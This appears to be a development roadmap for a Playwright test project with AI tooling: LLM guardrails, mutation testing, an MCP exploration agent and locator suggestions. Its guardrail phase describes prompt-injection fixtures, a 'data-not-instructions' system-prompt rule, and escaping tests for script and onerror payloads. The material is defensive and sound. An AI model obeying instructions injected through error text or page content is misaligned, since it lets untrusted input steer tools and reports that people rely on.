| P10-M1-01 | Prompt wraps error excerpt in delimiters; delimiter sequences inside the excerpt are neutralised |
| P10-M1-02 | System prompt contains the data-not-instructions rule |
| P10-M1-03 | Injected fixture + "obedient" fake provider → report still shows heuristic classification first |

## P10-M2 — Output contract hardening (LLM05 Improper Output Handling)

**Status:** ✅ Completed  
**Completed:** 2026-11-07

### Implementation scope

- Strict schema in `parseSuggestionPayload`: `summary` ≤ 300 chars, 2–4 `hypotheses` ≤ 400 chars each, 1–3 `caveats`, no unknown keys
- `escapeMarkdown()` used by `markdownSuggestionSection` and run-summary output: neutralise `![`, `[...](...)`, raw HTML tags, headings, and code fences
- AI section always labelled "AI suggestion — unverified" in all formats

### Test cases

| ID | Scenario |
|---|---|
| P10-M2-01 | Image/link payload renders as inert text in Markdown |
| P10-M2-02 | `<script>` / `<img onerror>` payload is escaped in HTML (regression guard) |
| P10-M2-03 | Oversized or too many hypotheses → `null` → heuristic-only report |
| P10-M2-04 | Extra keys / wrong types → `null` |

## P10-M3 — Input redaction (LLM02 Sensitive Information Disclosure)

**Status:** ✅ Completed  
**Completed:** 2026-11-07

### Implementation scope

- `ai/shared/redact.mts`: redact bearer tokens, JWTs, `KEY=value` secrets, emails and URL query strings before building the prompt
- Report notes how many items were redacted (never the values)

### Test cases

| ID | Scenario |
|---|---|
| P10-M3-01 | JWT / Bearer / `API_KEY=` values replaced with `[REDACTED]` |
| P10-M3-02 | Fake provider asserts the request body contains no fixture secrets |
| P10-M3-03 | Non-secret error text is unchanged |

## P10-M4 — Docs

**Status:** ✅ Completed  
**Completed:** 2026-11-07

- `docs/AI_GUIDELINES.md`: threat model table (input → prompt → output → sink) with OWASP IDs
- Analyzer README: "Guardrails" section + demo command on the injection fixture
- `docs/DEMO.md`: optional 1-minute "attack the analyzer" segment

### Acceptance criteria

- [x] Injection fixture + tests (P10-M1)
- [x] Strict output schema + Markdown escaping (P10-M2)
- [x] Redaction before any provider call (P10-M3)
- [x] Threat model documented with OWASP mapping (P10-M4)
- [x] `npm run test:ai` green, no API key required

---

## Phase 10 — Milestone Dependency Graph

```text
Phase 3 failure analyzer (optional LLM)
 └── P10-M1 Adversarial fixtures
      ├── P10-M2 Output contract hardening
      └── P10-M3 Input redaction
           └── P10-M4 Docs
```

## Phase 10 — Progress Summary

| Milestone | Status | Completed |
|---|---|---|
| P10-M1 — Adversarial fixtures | ✅ Completed | 2026-11-07 |
| P10-M2 — Output contract hardening | ✅ Completed | 2026-11-07 |
| P10-M3 — Input redaction | ✅ Completed | 2026-11-07 |
| P10-M4 — Docs | ✅ Completed | 2026-11-07 |

---

# Phase 11 — Quality Gates for AI-Written Code

**Status:** ✅ Completed  
**Completed:** 2026-11-07  
**Current focus:** —

### Goal

Add CI gates that catch the typical failure modes of AI-assisted development (on top of the Phase 9 dependency gate): unit tests that are green but assert nothing, and test code that ignores the project's own conventions and fixtures.

### Design principles

- Each gate is a separate CI job with a clear pass/fail reason in the PR summary comment
- LLM review is optional: a heuristic layer always runs, the LLM layer only runs when a key is present (it is skipped on fork PRs, which get no secrets)
- Expensive gates run on a path filter, not on every pull request. Mutation testing stays on the logic modules and uses per-test coverage so it finishes in minutes. Report templates and CLIs are not part of this gate.

### User scenarios

1. Someone weakens an `expect` in `ai/**/*.test.mts` → mutation score drops below threshold → CI fails.
2. A new spec uses `page.waitForTimeout` and a CSS selector, and re-implements login → the PR comment points to `getByRole` and `auth.fixture`.

---

## P11-M1 — Mutation testing (Stryker)

**Status:** ✅ Completed  
**Completed:** 2026-11-07

### Why the first plan was too slow

Mutating every `ai/**/*.mts` file with the command runner produced 2,276 mutants. That runner only sees the process exit code, so each mutant re-ran the whole unit suite. A baseline was still unfinished after ten minutes. That cannot be a pull-request check.

### Implementation scope

- `@stryker-mutator/tap-runner` with Node's test runner (`--experimental-strip-types`, TAP reporter) and `coverageAnalysis: "perTest"`. A mutant runs the test file that covers it, not the whole suite. The TAP runner counts one test file as one test.
- Mutate the logic modules only: `redact.mts`, `markdown.mts`, `pathContainment.mts`, `cliArgs.mts`, `gate.mts`, `classify.mts`, `suggest.mts`, `analyze.mts`. Do not mutate report templates or CLI entrypoints. Those files are mostly strings, and string mutants dominated the slow run.
- `ignoreStatic: true`, which requires per-test coverage. Incremental results in CI.
- `npm run test:mutation`. HTML report uploaded as an artifact.
- `thresholds.break` is 47. The first measured score on 2026-11-07 was 52.51 across 657 mutants in 45 seconds.
- CI runs this job when a pull request changes `ai/` (not Markdown) or `stryker.config.json`. A nightly run uses the same fast set. It does not run the Playwright matrix.

### Test cases

| ID | Scenario |
|---|---|
| P11-M1-01 | Baseline run completes in minutes; score and break threshold recorded in docs |
| P11-M1-02 | Deliberately weakened assertion → surviving mutant reported |
| P11-M1-03 | Score below `break` → the Stryker process exits non-zero |

## P11-M2 — Convention-aware PR review of test code (LLM-as-a-judge)

**Status:** ✅ Completed  
**Completed:** 2026-11-07

### Implementation scope

- `ai/pr-review/`: collect the PR diff for `tests/**`
- **Heuristic layer (always runs):** `waitForTimeout`, CSS/XPath locators where a role exists, missing suite tag, login steps re-implemented instead of `auth.fixture`, `test.only`
- **LLM layer (optional):** prompt built from `docs/TESTING.md`, `docs/AI_GUIDELINES.md` and the fixtures index; output goes through Phase 10 schema + escaping
- Findings appended to the existing sticky PR comment; the job comments and never blocks a merge on its own

### Test cases

| ID | Scenario |
|---|---|
| P11-M2-01 | Diff with `waitForTimeout` → heuristic finding with file:line |
| P11-M2-02 | Diff re-implementing login → points to `auth.fixture` |
| P11-M2-03 | No API key → heuristic-only, job passes |
| P11-M2-04 | Fake LLM returns malicious Markdown → escaped in comment |

## P11-M3 — Docs

**Status:** ✅ Completed  
**Completed:** 2026-11-07

- `docs/TESTING.md`: extend the "CI gates" table from Phase 9 (gate, trigger, threshold, how to fix)
- README: gates added to the AI tooling list and demo

### Acceptance criteria

- [x] Stryker baseline + break threshold (P11-M1)
- [x] Heuristic + optional LLM review in PR comment (P11-M2)
- [x] Gates documented (P11-M3)

---

## Phase 11 — Milestone Dependency Graph

```text
Phase 9 dependency gate + Phase 10 guardrails
 ├── P11-M1 Mutation testing
 └── P11-M2 Convention-aware PR review
      └── P11-M3 Docs
```

## Phase 11 — Progress Summary

| Milestone | Status | Completed |
|---|---|---|
| P11-M1 — Mutation testing | ✅ Completed | 2026-11-07 |
| P11-M2 — Convention-aware PR review | ✅ Completed | 2026-11-07 |
| P11-M3 — Docs | ✅ Completed | 2026-11-07 |

---

# Phase 12 — Agentic Exploratory Testing

**Status:** ✅ Completed  
**Completed:** 2026-11-08  
**Current focus:** —

### Goal

Use the existing Playwright MCP setup to run a spec-driven exploration agent against the demo shop. The agent tries to break flows described in `docs/APP_SPEC.md` and reports findings as reproducible steps. It does not write tests on its own: a human promotes findings into specs.

### Design principles

- Bounded: step budget, allowed origin (`localhost:5173` only), no form submission outside the app
- Every finding = steps + screenshot + spec reference; unreproducible findings are dropped
- Seeded bugs prove the agent works (a known-bad build must yield findings)

## P12-M1 — Exploration agent

**Status:** ✅ Completed  
**Completed:** 2026-11-08

- `ai/explorer/`: charter per flow (cart, checkout, auth) generated from `APP_SPEC.md`; runs via Playwright MCP with a step budget
- Output: JSONL findings + Markdown report (Phase 10 escaping applies)

### What was implemented

- `npm run explore` starts `@playwright/mcp` (pinned to 0.0.84, same as `.mcp.json`) over stdio with `--isolated`, `--allowed-origins <shop>`, and the repo's Playwright Chromium.
- `charters.mts` reads the bullets under `## Shopping Cart`, `## Checkout`, `## Login` and `## Error Handling`; a missing section fails the run.
- **Probe layer (always runs):** 13 scripted probes, each tied to one spec bullet. Oracles (`oracles.mts`) compare the cart table, total and badge with `app/src/data/products.json`, so a wrong total cannot confirm itself.
- **Model layer (optional):** tool-calling loop over a reduced MCP tool set plus `report_finding` / `finish`. Anthropic (`ANTHROPIC_API_KEY`, `ANTHROPIC_MODEL`) is preferred; OpenAI is the fallback. `--no-llm` turns it off.
- **Reproduction:** a failing probe runs again from cleared storage and is kept only if it fails the same way. A model finding must cite a charter requirement verbatim; its steps are replayed from a fresh state and its evidence text must be on the page afterwards. Others are listed as dropped.
- **Bounds:** shared tool-call budget (`--budget`, default 400); per charter for the model, `--model-steps` (30) and `--model-turns` (40); at most 3 model findings per charter. Off-origin navigation is refused before it reaches MCP.
- Report: `ai-reports/explorer/report.md`, `findings.jsonl`, `screenshots/<id>.png`.

### Measured

- Real shop: 13/13 probes pass, about 220 tool calls, under a minute.
- Hand-seeded bugs (decrease to 0 keeps the line; Remove does nothing): both reported with steps and a screenshot, no false positives. Formal seeded-bug metrics are P12-M2.

### Architectural decisions

- Hybrid instead of model-only: the probe layer is free and deterministic, which P12-M2 needs as a baseline, and matches the "heuristics always, model optional" pattern from Phases 3 and 11.
- Page text from MCP is untrusted input to the model: redacted with `ai/shared/redact.mts` and wrapped in delimiters that page content cannot close.
- Snapshot parsing, oracles and charters are pure modules added to the mutation gate (score 58.25 overall, up from 53.88). `agent.mts` is not mutated: it is mostly prompt and schema strings, and mutating it added about 50 seconds to a clean run.
- Argument parsing lives in `args.mts` so unit tests do not load the MCP SDK.

### Deviations

- MCP writes files only inside its output directory, so the output directory doubles as the MCP output root; its `console-*.log` files stay next to the report.
- Not run in CI yet. A scheduled run belongs with P12-M2, once there is a detection rate to track.

### Dependencies

- Added dev dependencies: `@playwright/mcp` (0.0.84, exact) and `@modelcontextprotocol/sdk` (^1.32). `npm audit --audit-level=high` unchanged (6 moderate, as on main).

### Test cases

| ID | Scenario |
|---|---|
| P12-M1-01–03 | Snapshot parser and oracles against real MCP snapshots (cart, invalid checkout) |
| P12-M1-04 | Charters built from APP_SPEC; missing section throws |
| P12-M1-05–06 | Origin guard, step budget, MCP error detection |
| P12-M1-07–08 | Unreproducible failures dropped; budget stop marks later charters |
| P12-M1-09–11 | Model findings confirmed by replay; tool allow-list; requirement must be cited; page text delimited and redacted |
| P12-M1-12, 15 | OpenAI and Anthropic message mapping |
| P12-M1-13–14 | Report escaping, JSONL, CLI accepts localhost only |

## P12-M2 — Seeded-bug evaluation

**Status:** ✅ Completed  
**Completed:** 2026-11-08

- Feature flag in the demo app that injects 3–5 known bugs (e.g. negative quantity accepted, total not updated)
- Metric: seeded bugs found / false positives per run, tracked like Phase 7 trends

### What was implemented

- `app/src/seededBugs.ts`: five bugs behind `isSeeded()`, on only when the Vite **dev** server runs with `VITE_SEEDED_BUGS=<names|all>`. Production builds and unit tests always see them off. The dev console warns when any are on.
- Bugs: `cart-remove-noop`, `cart-total-ignores-quantity`, `checkout-email-not-checked`, `cart-not-saved`, `detail-adds-twice`.
- `npm run explore:eval`: starts a dev server on port 5174 per scenario (clean shop + one per bug), runs the explorer, scores it, writes `ai-reports/explorer-eval/evaluation.md`, and appends to `history.jsonl`.
- Scoring (`evaluate.mts`): a bug is caught when a finding cites one of its spec requirements; every finding on the clean shop is a false positive; other findings in a bug run are listed as knock-on effects.
- `run.mts` holds the single-run logic, shared by `explore` and `explore:eval`.

### Measured

- 2026-11-08, probes only: **4/5 caught, 0 false positives**, about 6 minutes. Missed: `detail-adds-twice`.
- `cart-not-saved` also produced 8 knock-on findings (every probe that reloads the cart).

### Architectural decisions

- One bug per run instead of all at once: bugs interact (an unsaved cart breaks almost every cart probe), and per-run attribution would be guesswork.
- One bug is deliberately outside probe coverage, so the metric shows a gap the model layer can be compared on rather than a flattering 100%.
- Matching by spec requirement, not probe id, so model findings are scored the same way as probes.

### Deviations

- Found while writing the scorer: the charter reader only took bullets, so "The cart should persist after page refresh." (a sentence in APP_SPEC) was never offered to the model. The reader now also takes sentences with should/must, and a test checks that every probe and every seeded bug cites a real charter line.
- Not in CI: a full run is about 6 minutes of browser time. Worth a nightly job now that the model layer is measured too (Sonnet 5.5 caught `detail-adds-twice` after the replay fixes in #48/#49; Haiku 4.5 did not).

### Test cases

| ID | Scenario |
|---|---|
| P12-M2-01–02 | Flag only works in the dev server; parsing, `all`, unknown names |
| P12-M2-03–04 | Scored bug list matches the app; every bug requirement is a charter line |
| P12-M2-05 | Caught vs other findings vs false positives |
| P12-M2-06–07 | History lines round-trip, bad lines skipped; report escapes text |
| P12-M2-08 | `explore:eval` options |
| P12-M2-09 | Every probe cites a charter line |

## P12-M3 — Finding → draft spec

**Status:** ✅ Completed  
**Completed:** 2026-11-08

- Command that turns a confirmed finding into a draft `@e2e` spec using POM + fixtures, opened as a PR for human review

### What was implemented

- Findings now carry structured `actions` (goto / click role+name / type label) and probe `checks` (cart total, badge, row visible/absent, URL, invalid field, visible text, button/link visible).
- `npm run explore:draft -- --finding <id>` writes `tests/e2e/explored/<id>.spec.ts` using page objects, `loginViaUi` and `fillForm`; falls back to `getByRole`/`getByLabel` with `exact: true`.
- `--pr` branches from `origin/main`, commits only the spec, pushes and opens a **draft** PR with the four-section description; `--dry-run` prints the commands.
- Incomplete drafts (model findings, ref-only steps) are written as `test.fixme` with TODOs.

### Measured

- Drafts for 3 seeded-bug findings: pass on the clean shop, each fails only with its own bug on, 5 repeats without flakes, no convention-review findings.
- All 3 duplicate existing smoke tests, so none were committed; one kept as `docs/samples/explored-draft.spec.ts.txt`.

### Architectural decisions

- Deterministic code generation, no model: the same finding always gives the same spec, and finding text can only appear as escaped string literals or one-line comments (tested with a hostile title).
- Drafts assert the spec, not the observed behaviour, so they fail while the bug exists and become regression tests once it's fixed.
- `--pr` opens a draft PR and never merges: a person decides what becomes a test.

### Deviations

- `--pr` was verified with `--dry-run` and unit tests; the live git push + `gh api` path was not run against the repo here, to avoid opening a demo PR.
- Mutation gate now includes `evaluate.mts` and `draft.mts`: score 61.13; a clean run took about 4 minutes on the dev machine (was 2–3).

### Test cases

| ID | Scenario |
|---|---|
| P12-M3-01 | Recorded probe finding → page-object spec |
| P12-M3-02–03 | Demo-user login → `loginViaUi`; wrong password stays plain; checkout → `fillForm` |
| P12-M3-04 | Model / ref-only findings → `test.fixme` + TODO |
| P12-M3-05 | Hostile finding text can't escape strings, comments or the output path |
| P12-M3-06 | Every check kind has an assertion |
| P12-M3-07 | PR description: four sections, escaped |
| P12-M3-08 | `--pr` commands: fetch, branch from base, one-file commit, draft PR |

## P12-M4 — Docs

**Status:** ✅ Completed  
**Completed:** 2026-11-08

- `docs/DEMO.md` segment + honest limitations (cost, nondeterminism, budget)

### What was implemented

- `docs/DEMO.md`: optional two-minute "Exploration agent" segment (live probe run, seeded-bug scorecard, finding → draft) with talking points, plus cheat-sheet commands.
- `ai/explorer/README.md`: limits table: coverage, shared blind spots, cost, nondeterminism, budget, runtime, evidence matching, spec as oracle, tool version, each with what keeps it in check.
- README: Phase 12 marked complete; exploration agent added to Known limitations.

### Acceptance criteria

- [x] Bounded agent run produces a findings report (P12-M1)
- [x] Seeded-bug detection rate measured (P12-M2)
- [x] Finding → draft spec flow (P12-M3)
- [x] Limitations documented (P12-M4)

## Phase 12 — Progress Summary

| Milestone | Status | Completed |
|---|---|---|
| P12-M1 — Exploration agent | ✅ Completed | 2026-11-08 |
| P12-M2 — Seeded-bug evaluation | ✅ Completed | 2026-11-08 |
| P12-M3 — Finding → draft spec | ✅ Completed | 2026-11-08 |
| P12-M4 — Docs | ✅ Completed | 2026-11-08 |

---

# Phase 13 — Locator Change Suggestions

**Status:** ✅ Completed  
**Completed:** 2026-11-09  
**Current focus:** —

### Goal

When a test fails because a locator finds nothing (for example a button renamed from "Place order" to "Complete purchase"), the failure report suggests the most likely replacement, taken from the page snapshot Playwright saves on failure. It suggests and explains; it never edits a test.

### Design principles

- **Suggest, don't self-heal:** a renamed element can be intended or can be the bug. Silent auto-healing would hide the second case.
- Deterministic matching first (role, accessible name similarity); a model only breaks ties, optionally (Phase 10 guardrails apply).
- Say when there's nothing to suggest, and why: the element is still there (so it's hidden, disabled or slow), nothing similar exists, or the locator type isn't visible in the snapshot (test ids, placeholders).
- Measured the same way as Phase 12: planted renames, counted hits.

## P13-M1 — Locator suggestions in the failure report

**Status:** ✅ Completed  
**Completed:** 2026-11-08

### What was implemented

- `ai/failure-analyzer/locator.mts`: reads the failed locator from `error-context.md` ("waiting for …" or "Locator: …" lines; `getByRole`, `getByLabel`, `getByText`; escaped quotes; last link of a chain) and the YAML page snapshot, then ranks elements by name similarity (character-bigram Dice or word Jaccard, whichever is higher).
- `getByRole`: same role; a clickable element whose role changed (button → link) is offered with a note and a score penalty. `getByLabel`: form controls. `getByText`: any name or text.
- Confidence: high (score ≥ 0.75 and a clear lead), medium (≥ 0.6), low; up to 3 candidates; `exact: true` is kept.
- No candidate, with a reason, when the element is still in the snapshot, nothing is similar, or the locator is a test id / placeholder.
- Markdown and HTML investigation reports get a **Locator suggestions** section when a failed locator is found.

### Measured

- Three real Playwright failures (renamed button, heading text in an `expect`, label): the right element is the only candidate each time, confidence high, even on the products page with eight similar "Add … to cart" buttons.

### Deviations

- The adversarial report test found that a snapshot containing three backticks in page text was cut short by both snapshot readers (this one and the explorer's). Both now require the closing fence at the start of a line.

### Test cases

| ID | Scenario |
|---|---|
| P13-M1-01 | Real failures: renamed button, heading (`Locator:` line), label with `exact: true` |
| P13-M1-02 | Parsing: escaped quotes, chains, `getByText`, non-locator errors |
| P13-M1-03 | No guess: element present, nothing similar, test id, no snapshot |
| P13-M1-04 | Role change button → link; close ties lower confidence |
| P13-M1-05 | Similarity: case/punctuation, unrelated text |
| P13-M1-06 | Report sections; hostile page text can't break the code fence or inject HTML |

## P13-M2 — Optional model tie-break

**Status:** ✅ Completed  
**Completed:** 2026-11-08

- When two or more candidates are close, ask a model to pick, given the failed locator, the candidates and the surrounding snapshot. Output must name one of the listed candidates (or none); Phase 10 delimiting, redaction and schema checks apply.

### What was implemented

- `ai/failure-analyzer/locator-tiebreak.mts`: runs only when there are 2+ candidates and confidence isn't high. Anthropic first (`ANTHROPIC_API_KEY`, `ANTHROPIC_MODEL`), OpenAI as fallback; `--no-llm` skips it. Temperature 0, 200 max tokens.
- Prompt: candidates and up to 4,000 characters of snapshot inside `<<<UNTRUSTED_PAGE_SNAPSHOT>>>` markers the page can't close; secrets redacted.
- Reply must be exactly `{"choice": <1..n or null>, "reason": "<= 200 chars"}`; anything else is dropped and the report keeps the similarity ranking.
- The report adds one line, "Model pick — unverified", escaped; it never reorders the candidates. A failed request is logged and skipped.

### Test cases

| ID | Scenario |
|---|---|
| P13-M2-01 | Called only on a tie |
| P13-M2-02 | Page text fenced and redacted; injected end marker removed |
| P13-M2-03 | Strict reply: out-of-range, non-integer, extra keys, long reason, prose → dropped |
| P13-M2-04 | One call per tie; none on a clear answer; unusable reply dropped |
| P13-M2-05 | Request shapes; HTTP errors; Anthropic preferred |
| P13-M2-06 | Report labels and escapes the pick |

## P13-M3 — Planted renames + docs

**Status:** ✅ Completed  
**Completed:** 2026-11-09

- A seeded "label drift" set (renamed buttons, headings, labels; one removed element; one role change) run through the suggester; metric: correct top suggestion / no false confident suggestions.
- README, `docs/DEMO.md` segment, `docs/TESTING.md` note on "suggest, don't self-heal".

### What was implemented

- Six dev-only drift switches in the app (`VITE_SEEDED_BUGS=drift-all`, or one by name): "Clear cart" → "Empty cart", "Place order" → "Complete purchase", heading "Log in" → "Sign in", label "Username" → "User name", "Browse products" link → button, "Proceed to checkout" removed. `all` still means the five behaviour bugs only.
- `npm run locator:eval`: runs `@smoke|@e2e` with every drift on, then re-runs any drift that broke no test on its own (an earlier drift can stop the tests first), and scores the suggestion for each failure against the expected answer.
- Locator parser accepts other role options (`level: 1`, `checked`, …); found because the login page object uses `level: 1`.

### Measured (2026-11-09, deterministic, no model)

| Drift | Failed tests | Right |
|---|---|---|
| Username → User name (label) | 23 | 23 |
| Proceed to checkout removed (expect no suggestion) | 12 | 12 |
| Browse products: link → button | 2 | 2 |
| Clear cart → Empty cart | 1 | 1 |
| Place order → Complete purchase | 4 | 0 (no suggestion) |
| Log in → Sign in (heading) | 1 | 0 (no suggestion) |

38 of 43 drift-caused failures (88%) right, **0 confident but wrong**, 0 unrelated failures. The two misses share no words with the original, and the suggester stays silent instead of guessing.

### Deviations

- First run measured "Place order" as breaking 0 tests: every checkout test failed earlier on the renamed login label. Added the second, per-drift pass for masked drifts.
- Not in CI: about 3–4 minutes of browser time.

### Test cases

| ID | Scenario |
|---|---|
| P13-M3-01 | Drift list matches the app's switches |
| P13-M3-02 | Failures matched to drifts by kind, role, name |
| P13-M3-03 | Right, wrong, confident-wrong, removed element, labels, unrelated |
| P13-M3-04 | Totals and rendering (escaped) |
| P13-M3-05 | CLI options |

### Acceptance criteria

- [x] Failure report suggests replacements for renamed elements (P13-M1)
- [x] Optional model tie-break (P13-M2)
- [x] Planted-rename score measured and documented (P13-M3)

## Phase 13 — Progress Summary

| Milestone | Status | Completed |
|---|---|---|
| P13-M1 — Locator suggestions in the failure report | ✅ Completed | 2026-11-08 |
| P13-M2 — Optional model tie-break | ✅ Completed | 2026-11-08 |
| P13-M3 — Planted renames + docs | ✅ Completed | 2026-11-09 |

---

## Separate repo: AI provenance gate (adopted 2026-11-09)

AI governance and traceability (ISO/IEC 42001, ISO 27001 audit trail) lives in a separate, reusable GitHub Action, [`ksycz/ai-provenance-action`](https://github.com/ksycz/ai-provenance-action). This repo consumes `v1.0.0` (pinned by commit SHA) in the **AI provenance** CI job, with the policy in `.github/ai-provenance.yml`. Planned scope, all in place:

- Detect AI-assisted changes from commit trailers (`Co-Authored-By: <AI tool>`, `Assisted-by:`) and PR labels
- Require stricter gates for AI-tagged PRs (e.g. Phase 11 mutation threshold must run)
- Emit an audit artifact per PR: AI-tagged files/lines, which gates ran, results
- Cross-link from README once adopted here ✅

Policy choices: one gate, mutation score ≥ 47 on AI-touched files (same bar as Phase 11), warning when no report exists because mutation testing only runs when `ai/` changes. No label or approval gates: one maintainer, and the Action doesn't count the author's own approval.

---

## Document History

| Date | Change |
|---|---|
| 2026-11-09 | AI provenance gate skips (not fails) when no mutation report exists, so docs-only PRs pass; the Action treats `warn` as `fail` |
| 2026-11-09 | `explore:eval` marks runs with model errors as incomplete instead of missed (#51) |
| 2026-11-09 | AI layer measured: Sonnet 5.5 caught the probe-blind bug `detail-adds-twice`, Haiku 4.5 did not; replay fixed to use role and name, with a wait for evidence (#47–#49) |
| 2026-11-09 | Adopted `ksycz/ai-provenance-action@v1.0.0`: AI provenance job, mutation gate on AI-touched files |
| 2026-11-09 | P13-M3 completed — planted label drift, `npm run locator:eval`: 38/43 right, 0 confident-wrong; Phase 13 complete |
| 2026-11-08 | P13-M2 completed — optional, strictly validated model tie-break for close locator suggestions |
| 2026-11-08 | Phase 13 defined; P13-M1 completed — locator suggestions in failure reports |
| 2026-11-08 | P12-M4 completed — demo segment and limits table for the exploration agent; Phase 12 complete |
| 2026-11-08 | P12-M3 completed — `npm run explore:draft` turns a finding into a page-object `@e2e` draft; `--pr` opens it as a draft PR |
| 2026-11-08 | P12-M2 completed — five seeded bugs behind a dev-only flag, `npm run explore:eval`, probes catch 4/5 with 0 false positives |
| 2026-11-08 | P12-M1 completed — bounded exploration agent via Playwright MCP: APP_SPEC charters, 13 probes, optional model layer with replay confirmation |
| 2026-11-07 | P11-M3 completed — CI gates table and README cover mutation testing and the test review |
| 2026-11-07 | P11-M2 completed — heuristic test-convention review on pull requests, optional model notes |
| 2026-11-07 | P11-M1 completed — mutation testing on logic modules via the TAP runner, break at 47 |
| 2026-11-07 | P10-M4 completed — threat model for analyzer input, prompt, output, and report sinks |
| 2026-11-07 | P10-M3 completed — redact secrets before a model request and note the count in the report |
| 2026-11-07 | P10-M2 completed — reject malformed model replies and escape the rest in Markdown and HTML |
| 2026-11-07 | P10-M1 completed — untrusted failure context is delimited in the analyzer prompt |
| 2026-11-07 | P9-M4 completed — Playwright image, 2 workers, path filters, cancel in-progress |
| 2026-11-06 | P9-M3 completed — CI gates table and Renovate versus Dependabot docs |
| 2026-11-06 | P9-M4 defined — faster CI: shared browser install, more workers, fewer repeated jobs |
| 2026-11-06 | P9-M2 completed — Renovate config, validator CI job, Dependabot alerts only |
| 2026-11-06 | P9-M1 how to test — README and roadmap commands for the dependency gate |
| 2026-11-06 | P9-M1 completed — CI `npm ci` + `npm audit`, new-dependency gate |
| 2026-11-06 | Phases 9–12 defined — dependency gate, LLM guardrails, quality gates for AI-written code, agentic exploratory testing |
| 2026-08-10 | Docs sync — ARCHITECTURE/APP_SPEC/TESTING/LESSONS/AI_GUIDELINES aligned to Phases 1–8 |
| 2026-08-10 | Docs polish — README 5-minute demo, architecture diagram, trace walkthrough |
| 2026-08-10 | Phase 8 completed — AI run/PR summary CLI + sticky PR comments |
| 2026-08-09 | Phase 7 completed — historical failure trends CLI (JSONL + Markdown) |
| 2026-08-08 | Phase 6 completed — Playwright visual regression (`@visual`) |
| 2026-07-23 | P5-M4 completed — API docs polish, negatives, Phase 5 complete |
| 2026-07-23 | P5-M2 + P5-M3 completed — app fetch client + Playwright `@api` suite/CI |
| 2026-07-20 | P5-M1 completed — static `/api` product JSON fixtures + Vite 404 middleware |
| 2026-07-20 | Phase 5 defined — API testing via static `/api` contract + Playwright request suite |
| 2026-07-20 | P4-M2 completed — flaky test detection CLI; Phase 4 complete |
| 2026-07-20 | P4-M1 completed — checkout Place order navigates before cart clear |
| 2026-07-20 | Phase 4 defined — P4-M1 checkout navigation flake, P4-M2 flaky detection |
| 2026-07-18 | P3-M5 completed — docs polish, sample report, CI `ai-unit` job; Phase 3 complete |
| 2026-07-18 | P3-M4 completed — optional LLM root-cause suggestions with offline fallback |
| 2026-07-17 | Phase Overview refreshed — Phase 2 ✅ Completed, Phase 3 🚧 In progress (P3-M4 next) |
| 2026-07-17 | P3-M3b completed — HTML investigation reports and `--format md|html|both` |
| 2026-07-17 | P3-M3 completed — Markdown investigation report generator and `analyze:report` CLI |
| 2026-07-17 | P3-M2 completed — heuristic failure classification with confidence scoring |
| 2026-07-17 | P3-M1 completed — failure artifact collector CLI, fixtures, and `npm run test:ai` |
| 2026-07-17 | Phase 3 milestones defined — P3-M1 through P3-M5 (AI Failure Analyzer) |
| 2026-07-15 | P2-M8 completed — GitHub Actions CI with smoke/e2e matrix and failure artifact upload; Phase 2 complete |
| 2026-07-10 | P2-M7 completed — artifact policy documented, trace/report scripts, and debugging workflow |
| 2026-07-10 | P2-M6 completed — E2E journey suites with @e2e tag, desktop/mobile purchase flow, and cart journeys |
| 2026-07-09 | P2-M5 completed — smoke suite refactored to POM/data/fixtures with `@smoke` tag filtering |
| 2026-07-08 | P2-M4 completed — auth and cart fixtures with example specs and fixture documentation |
| 2026-07-08 | P2-M3 completed — centralized test data modules for users, products, and checkout |
| 2026-07-07 | P2-M2 completed — Page Object Model for all major routes, three reference spec refactors |
| 2026-07-07 | P2-M1 completed — framework folders, enhanced Playwright artifacts/reporters, suite scripts, and testing conventions |
| 2026-07-06 | Phase 1 milestones renamed to P1-M1–P1-M10 for consistency with Phase 2 |
| 2026-07-06 | Phase 2 milestones defined — P2-M1 through P2-M8 (POM, fixtures, CI) |
| 2026-07-06 | Phase 1 completed — P1-M10 accessibility polish, 59 smoke tests, ready for Phase 2 |
| 2026-07-06 | P1-M10 completed — responsive layout, touch targets, cross-viewport E2E tests |
| 2026-07-06 | P1-M5 completed — shopping cart page, Local Storage, quantity controls |
| 2026-07-06 | P1-M4 completed — product detail page, slug routing, card links |
| 2026-07-06 | P1-M3 completed — product catalogue, CartContext, add to cart |
| 2026-07-06 | P1-M2 completed — React Router, AppLayout, navigation, 404 page |
| 2026-07-06 | P1-M1 completed — React app scaffold, Tailwind, Playwright foundation tests |
| 2026-07-06 | Initial roadmap created with Phase 1 milestones P1-M1–P1-M10 |
